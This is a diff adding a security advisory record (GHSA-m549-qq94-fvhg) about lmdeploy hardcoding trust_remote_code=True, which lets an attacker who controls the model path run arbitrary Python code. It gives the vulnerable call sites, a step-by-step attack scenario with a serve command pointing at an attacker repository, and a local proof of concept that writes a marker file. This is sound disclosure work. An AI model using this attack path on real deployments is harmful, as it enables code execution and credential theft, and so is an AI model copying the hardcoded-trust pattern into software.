@@ -1,0 +1,103 @@
+{
+  "id": "GHSA-m549-qq94-fvhg",
+  "modified": "2026-05-21T17:45:08.566225574Z",
+  "published": "2026-05-21T17:30:57Z",
+  "aliases": [
+    "CVE-2026-46432"
+  ],
+  "summary": "LMDeploy: Arbitrary code execution via hardcoded trust_remote_code=True in lmdeploy model initialization",
+  "details": "## Summary\n\nlmdeploy hardcodes `trust_remote_code=True` in multiple HuggingFace model-loading call sites.\n\nThe affected code paths are in:\n\n```text\nlmdeploy/archs.py\nlmdeploy/utils.py\n````\n\nThe vulnerable call sites pass `trust_remote_code=True` into HuggingFace Transformers APIs such as `AutoConfig.from_pretrained()`, `PretrainedConfig.get_config_dict()`, and `GenerationConfig.from_pretrained()`.\n\nBecause the model path is supplied by the operator or deployment configuration, an attacker who can control the `model_path` used by an lmdeploy serving process can point it to an attacker-controlled HuggingFace model repository. When lmdeploy starts and initializes the model, Transformers may download and execute remote Python code from that repository.\n\nSuccessful exploitation results in arbitrary code execution with the privileges of the lmdeploy serving process.\n\n## Affected version\n\nConfirmed affected:\n\n```text\nlmdeploy \u003c= 0.12.3\n```\n\nThe issue was verified on `v0.12.3` and on `main`.\n\n## Vulnerable code\n\nConfirmed call sites:\n\n```text\nlmdeploy/archs.py:154\nAutoConfig.from_pretrained(..., trust_remote_code=True)\n\nlmdeploy/archs.py:157\nPretrainedConfig.get_config_dict(..., trust_remote_code=True)\n\nlmdeploy/utils.py:225\nGenerationConfig.from_pretrained(..., trust_remote_code=True)\n```\n\nThe vulnerable pattern is:\n\n```python\nAutoConfig.from_pretrained(model_path, trust_remote_code=True)\n```\n\nand:\n\n```python\nGenerationConfig.from_pretrained(path, trust_remote_code=True)\n```\n\nThe risk is that `trust_remote_code=True` is enabled unconditionally. Users are not required to explicitly opt in through a CLI flag or configuration option.\n\n## Attack scenario\n\n1. An attacker obtains the ability to control or modify the model path used by an lmdeploy deployment. Examples include deployment configuration access, CI/CD configuration access, Kubernetes or container configuration access, or a managed environment where users can submit model IDs for serving.\n2. The attacker sets the model path to an attacker-controlled HuggingFace repository, for example:\n\n```text\nattacker-org/malicious-model\n```\n\n3. The lmdeploy serving process starts with that model path:\n\n```bash\nlmdeploy serve api_server attacker-org/malicious-model\n```\n\n4. During model initialization, lmdeploy calls HuggingFace Transformers APIs with `trust_remote_code=True`.\n5. Transformers loads and executes remote Python code from the attacker-controlled model repository.\n6. The payload runs with the privileges of the lmdeploy serving process.\n\n## Why this is security-sensitive\n\n`trust_remote_code=True` is a dangerous HuggingFace option because it allows model repositories to execute custom Python code during model loading.\n\nIn lmdeploy, this option is hardcoded at multiple call sites. This removes the explicit trust decision from the user or deployment operator. A safer design would require an explicit CLI flag or configuration option such as `--trust-remote-code`.\n\nlmdeploy is commonly used as a model serving daemon. The serving process may have access to model weights, GPU resources, API credentials, cloud credentials, request data, and internal network resources.\n\n## Proof of concept\n\nThe following PoC demonstrates the vulnerable primitive in a local, non-destructive way. It simulates lmdeploy calling a HuggingFace model-loading path with `trust_remote_code=True` and shows that remote model code would execute during initialization.\n\n```python\n#!/usr/bin/env python3\nfrom __future__ import annotations\n\nimport argparse\nimport importlib.util\nimport os\nimport sys\nimport tempfile\nfrom pathlib import Path\n\nMARKER = Path(\"/tmp/LMDEPLOY_TRUST_REMOTE_CODE_RCE_PROOF\")\nMALICIOUS_MODEL = \"attacker-org/malicious-model\"\n\n\ndef simulate_lmdeploy_model_load(model_path: str) -\u003e None:\n    \"\"\"\n    Simulates lmdeploy model initialization where trust_remote_code=True is hardcoded.\n\n    Real vulnerable pattern:\n        AutoConfig.from_pretrained(model_path, trust_remote_code=True)\n        GenerationConfig.from_pretrained(path, trust_remote_code=True)\n\n    When trust_remote_code=True, a malicious HuggingFace model repository can\n    execute custom Python code during loading.\n    \"\"\"\n\n    fake_model_dir = Path(tempfile.mkdtemp(prefix=\"fake_lmdeploy_model_\"))\n    module_name = model_path.split(\"/\")[-1].replace(\"-\", \"_\")\n    modeling_file = fake_model_dir / f\"modeling_{module_name}.py\"\n\n    payload = f'''\nimport os\nfrom pathlib import Path\n\nPath(\"{MARKER}\").write_text(\n    \"lmdeploy trust_remote_code execution confirmed\\\\n\"\n    f\"model_path={model_path!r}\\\\n\"\n    f\"pid={{os.getpid()}} euid={{os.geteuid()}}\\\\n\"\n)\n'''\n    modeling_file.write_text(payload)\n\n    spec = importlib.util.spec_from_file_location(f\"modeling_{module_name}\", modeling_file)\n    assert spec is not None and spec.loader is not None\n\n    mod = importlib.util.module_from_spec(spec)\n    spec.loader.exec_module(mod)\n\n\ndef main() -\u003e int:\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--model-id\", default=MALICIOUS_MODEL)\n    args = parser.parse_args()\n\n    if MARKER.exists():\n        MARKER.unlink()\n\n    print(f\"[*] Simulating lmdeploy loading model: {args.model_id}\")\n    print(\"[*] trust_remote_code=True is hardcoded in lmdeploy model-loading paths\")\n\n    simulate_lmdeploy_model_load(args.model_id)\n\n    if MARKER.exists():\n        print(\"[+] Code execution confirmed\")\n        print(MARKER.read_text())\n        return 0\n\n    print(\"[-] Marker file was not created\", file=sys.stderr)\n    return 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n```\n\nExpected result:\n\n```text\n[+] Code execution confirmed\n```\n\nThe marker file is written to:\n\n```text\n/tmp/LMDEPLOY_TRUST_REMOTE_CODE_RCE_PROOF\n```\n\n## Impact\n\nAn attacker who can control the model path used by an lmdeploy deployment can execute arbitrary Python code during model initialization.\n\nThe attacker may be able to:\n\n* Read files accessible to the lmdeploy process.\n* Access environment variables, model provider credentials, HuggingFace tokens, cloud credentials, and API keys.\n* Modify model-serving behavior or tamper with responses.\n* Execute arbitrary operating-system commands.\n* Access request data or internal service credentials available to the serving process.\n* Cause denial of service by crashing or destabilizing the serving daemon.\n* Pivot to internal services reachable from the lmdeploy host or container.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "lmdeploy",
+        "purl": "pkg:pypi/lmdeploy"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.13.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.10",
+        "0.0.11",
+        "0.0.12",
+        "0.0.13",
+        "0.0.14",
+        "0.1.0",
+        "0.10.0",
+        "0.10.1",
+        "0.10.2",
+        "0.11.0",
+        "0.11.1",
+        "0.12.0",
+        "0.12.1",
+        "0.12.2",
+        "0.12.3",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.2.3",
+        "0.2.4",
+        "0.2.5",
+        "0.2.6",
+        "0.3.0",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.5.1",
+        "0.5.2",
+        "0.5.2.post1",
+        "0.5.3",
+        "0.6.0",
+        "0.6.0a0",
+        "0.6.1",
+        "0.6.2",
+        "0.6.2.post1",
+        "0.6.3",
+        "0.6.4",
+        "0.6.5",
+        "0.7.0",
+        "0.7.0.post1",
+        "0.7.0.post2",
+        "0.7.0.post3",
+        "0.7.1",
+        "0.7.2",
+        "0.7.2.post1",
+        "0.7.3",
+        "0.8.0",
+        "0.9.0",
+        "0.9.1",
+        "0.9.2",
+        "0.9.2.post1"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-m549-qq94-fvhg/GHSA-m549-qq94-fvhg.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/InternLM/lmdeploy/security/advisories/GHSA-m549-qq94-fvhg"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/InternLM/lmdeploy/pull/4511"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/InternLM/lmdeploy"
+    }
+  ]
+}
